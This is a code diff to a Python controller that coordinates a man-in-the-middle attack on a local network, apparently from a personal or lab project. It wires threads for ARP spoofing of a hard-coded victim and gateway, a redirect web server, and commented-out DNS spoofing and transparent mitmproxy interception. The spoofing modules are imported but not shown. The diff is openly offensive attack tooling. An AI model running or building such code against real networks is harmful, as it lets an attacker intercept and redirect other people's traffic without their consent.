@@ -2,29 +2,41 @@ import threading
 from arp_spoof import ARPSpoofer
 from dns_spoof import DNSSpoofer
 from web_server import WEBServer
+from mitmproxy.tools.main import mitmdump
+import sys
 
 class SpoofingController:
-    def __init__(self, victim_ip, router_ip, attacker_ip, attacker_mac, redirect_to, domain=None):
-        self.arp_spoofer = ARPSpoofer(victim_ip, router_ip, attacker_mac)
-        self.dns_spoofer = DNSSpoofer(attacker_ip, victim_ip, domain)
-        self.web_server = WEBServer(redirect_to)
+    def __init__(self, victim:dict, gtw:dict, attacker:dict):
+        self.arp_spoofer = ARPSpoofer(victim_ip=victim.get('ip'), router_ip=gtw.get('ip'), attacker_mac=attacker.get("mac"), victim_mac=victim.get('mac'), router_mac=gtw.get('mac'))
+        # self.dns_spoofer = DNSSpoofer(attacker_ip, victim_ip, domain)
+        self.web_server = WEBServer(attacker.get("ip"))
 
     def start_attack(self):
         print("Starting ARP spoofing, DNS spoofing, and Web server...")
+        def start_mitmproxy():
+            sys.argv = [
+                "mitmdump",           # Run mitmdump
+                "-s", "proxy.py",  # Use your custom mitmproxy script
+                "--mode", "transparent"  # Transparent proxy mode
+            ]
+            mitmdump()
 
         # Create threads for each task
         arp_thread = threading.Thread(target=self.arp_spoofer.spoof)
-        dns_thread = threading.Thread(target=self.dns_spoofer.spoof)
+        # dns_thread = threading.Thread(target=self.dns_spoofer.spoof)
         web_thread = threading.Thread(target=self.web_server.listen)
+        # mitmproxy_thread = threading.Thread(target=start_mitmproxy)
 
         # Start all threads
         arp_thread.start()
-        dns_thread.start()
+        # mitmproxy_thread.start()
+        # dns_thread.start()
         web_thread.start()
 
         # Wait for all threads to finish
         arp_thread.join()
-        dns_thread.join()
+        # mitmproxy_thread.join()
+        # dns_thread.join()
         web_thread.join()
 
     def stop_attack(self):
@@ -32,13 +44,24 @@ class SpoofingController:
 
 
 if __name__ == "__main__":
-    victim_ip = "192.168.1.68"
-    router_ip = "192.168.1.254"
-    attacker_ip = "192.168.1.82"
-    attacker_mac = "ac:bc:32:91:0a:ad"
-    redirect_to = "youtube.com"
+    victim = {
+        'ip' : '192.168.1.74',
+        'mac' : "8:0:27:b4:97:59"
+    }
+    gtw = {
+        'ip' : '192.168.1.254',
+        'mac' : "80:ca:4b:ac:f3:3"
+    }
+    attacker = {
+        'ip' : '192.168.1.72',
+        'mac' : "ac:bc:32:91:0a:ad"
+    }
+
+    controller = SpoofingController(victim=victim, gtw=gtw, attacker=attacker)
+
+    # Define a function to run `mitmdump` with your custom script
     
-    controller = SpoofingController(victim_ip, router_ip, attacker_ip, attacker_mac, redirect_to)
+    
 
     try:
         controller.start_attack()
